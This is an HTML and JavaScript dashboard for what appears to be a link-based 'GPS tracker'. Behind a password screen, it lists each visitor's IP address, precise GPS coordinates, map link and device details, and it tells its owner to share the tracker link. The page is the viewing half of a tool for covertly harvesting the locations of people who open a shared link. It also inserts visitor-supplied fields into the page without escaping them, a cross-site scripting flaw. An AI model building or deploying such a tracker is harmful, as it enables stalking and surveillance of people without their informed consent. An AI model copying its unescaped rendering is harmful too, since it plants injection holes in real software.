<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard · GPS Tracker</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
        body { background:#0b1120; color:#e2e8f0; padding:2rem; }
        .container { max-width:1200px; margin:0 auto; }
        h1 { font-weight:300; }
        .sub { color:#94a3b8; margin:0.5rem 0 2rem; }
        #loginOverlay { position:fixed; inset:0; background:#0b1120; display:flex; align-items:center; justify-content:center; z-index:999; }
        #loginOverlay.hidden { display:none; }
        #loginBox { background:#1e293b; padding:2.5rem; border-radius:1.5rem; width:350px; }
        #loginBox h2 { margin-bottom:1.5rem; }
        #loginBox input { width:100%; padding:0.8rem; border-radius:0.8rem; border:1px solid #334155; background:#0f172a; color:#fff; font-size:1rem; margin-bottom:1rem; }
        #loginBox button { width:100%; padding:0.8rem; background:#2563eb; border:none; border-radius:0.8rem; color:#fff; font-weight:700; cursor:pointer; }
        #loginBox .error { color:#ef4444; margin-top:0.5rem; display:none; }
        .log-entry { background:#1e293b; padding:1rem; border-radius:0.5rem; margin-bottom:0.5rem; border-left:3px solid #2563eb; }
        .log-entry .ip { color:#38bdf8; font-weight:600; }
        .log-entry .time { color:#94a3b8; font-size:0.8rem; }
        .log-entry .gps { color:#22c55e; font-weight:600; }
        .log-entry .gps-link { color:#22c55e; text-decoration:underline; cursor:pointer; font-size:0.8rem; }
        .log-entry .gps-link:hover { color:#4ade80; }
        .badge-gps { display:inline-block; background:#1e3a2f; color:#22c55e; padding:0.1rem 0.5rem; border-radius:1rem; font-size:0.6rem; }
        .badge-ip { display:inline-block; background:#1e3a5f; color:#38bdf8; padding:0.1rem 0.5rem; border-radius:1rem; font-size:0.6rem; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:1rem; margin-bottom:1.5rem; }
        .stat-box { background:#1e293b; padding:0.8rem; border-radius:0.5rem; text-align:center; }
        .stat-box .num { font-size:1.8rem; font-weight:700; color:#38bdf8; }
        .stat-box .label { color:#94a3b8; font-size:0.7rem; }
        .empty { color:#64748b; text-align:center; padding:2rem; }
        .refresh-btn { background:#1e293b; border:1px solid #334155; color:#e2e8f0; padding:0.5rem 1.2rem; border-radius:0.5rem; cursor:pointer; margin-bottom:1rem; }
        .refresh-btn:hover { background:#334155; }
    </style>
</head>
<body>
<div id="loginOverlay">
    <div id="loginBox">
        <h2>🔐 Dashboard</h2>
        <input type="password" id="passInput" placeholder="Enter password">
        <button id="loginBtn">Unlock</button>
        <div class="error" id="loginError">Invalid password</div>
    </div>
</div>
<div class="container">
    <div style="display:flex;justify-content:space-between;align-items:center;">
        <h1>📡 GPS Tracker · Live Visitors</h1>
        <button class="refresh-btn" onclick="loadVisitors()">🔄 Refresh</button>
    </div>
    <div class="sub">Visitors appear here in real-time with GPS coordinates</div>
    
    <div class="stats">
        <div class="stat-box"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
        <div class="stat-box"><div class="num" id="statGPS">0</div><div class="label">📍 GPS</div></div>
        <div class="stat-box"><div class="num" id="statIP">0</div><div class="label">🖥 IP Only</div></div>
    </div>
    
    <div id="visitorLog"></div>
</div>

<script>
document.getElementById('loginBtn').addEventListener('click', async () => {
    const pass = document.getElementById('passInput').value;
    const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: pass })
    });
    const data = await res.json();
    if (data.success) {
        document.getElementById('loginOverlay').classList.add('hidden');
        loadVisitors();
        // Auto-refresh every 10 seconds
        setInterval(loadVisitors, 10000);
    } else {
        document.getElementById('loginError').style.display = 'block';
    }
});

document.getElementById('passInput').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') document.getElementById('loginBtn').click();
});

async function loadVisitors() {
    try {
        const res = await fetch('/api/visitors');
        const data = await res.json();
        
        // Update stats
        const total = data.length;
        const gpsCount = data.filter(v => v.gps_lat && v.gps_lon).length;
        const ipCount = total - gpsCount;
        document.getElementById('statTotal').textContent = total;
        document.getElementById('statGPS').textContent = gpsCount;
        document.getElementById('statIP').textContent = ipCount;
        
        const log = document.getElementById('visitorLog');
        if (data.length === 0) {
            log.innerHTML = '<div class="empty">No visitors yet. Share your tracker link!</div>';
            return;
        }
        
        log.innerHTML = data.map(v => {
            const hasGPS = v.gps_lat && v.gps_lon;
            const mapUrl = hasGPS ? `https://www.google.com/maps?q=${v.gps_lat},${v.gps_lon}` : '#';
            return `
            <div class="log-entry">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                    <div>
                        <span class="ip">${v.ip}</span>
                        <span style="margin-left:0.5rem;font-size:0.7rem;color:#94a3b8;">${new Date(v.timestamp).toLocaleString()}</span>
                    </div>
                    ${hasGPS ? '<span class="badge-gps">✅ GPS</span>' : '<span class="badge-ip">IP Only</span>'}
                </div>
                ${hasGPS ? `
                    <div style="margin-top:0.3rem;">
                        <span class="gps">📍 ${parseFloat(v.gps_lat).toFixed(5)}, ${parseFloat(v.gps_lon).toFixed(5)}</span>
                        <span style="color:#64748b;font-size:0.7rem;margin-left:0.5rem;">Accuracy: ${Math.round(v.gps_accuracy)}m</span>
                        <a href="${mapUrl}" target="_blank" class="gps-link" style="margin-left:0.5rem;">🗺️ View Map</a>
                    </div>
                ` : `
                    <div style="margin-top:0.3rem;color:#64748b;font-size:0.8rem;">📍 GPS not available (user denied or not supported)</div>
                `}
                <div style="margin-top:0.2rem;color:#64748b;font-size:0.7rem;word-break:break-all;">${v.userAgent || 'Unknown device'}</div>
            </div>
        `}).join('');
    } catch(e) {
        console.log('Error loading visitors:', e);
    }
}
</script>
</body>
</html>
